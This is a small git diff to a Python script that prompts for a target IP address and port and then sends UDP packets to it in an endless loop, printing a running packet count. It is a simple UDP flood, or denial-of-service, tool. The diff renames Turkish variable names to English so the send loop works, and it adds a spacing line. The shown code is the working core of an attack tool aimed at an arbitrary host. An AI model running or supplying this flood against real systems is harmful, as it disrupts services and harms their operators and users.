@@ -10,6 +10,7 @@ print("Author --> https://www.instagram.com/iskender_eren_goktas")
 print(" ")
 print(" ")
 target_ip = str(input("Enter the target Ip number -->   "))
+print(" ")
 try:
     target_port = int(input("Enter the target post number -->   "))
 except ValueError:
@@ -22,6 +23,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 packega = 0
 
 while True:
-    sock.sendto(bytes, (hedef_ip, hedef_port))
+    sock.sendto(bytes, (target_ip, target_port))
     packega = packega+1
     print("Number of packages sent -->  %s" %(packega))
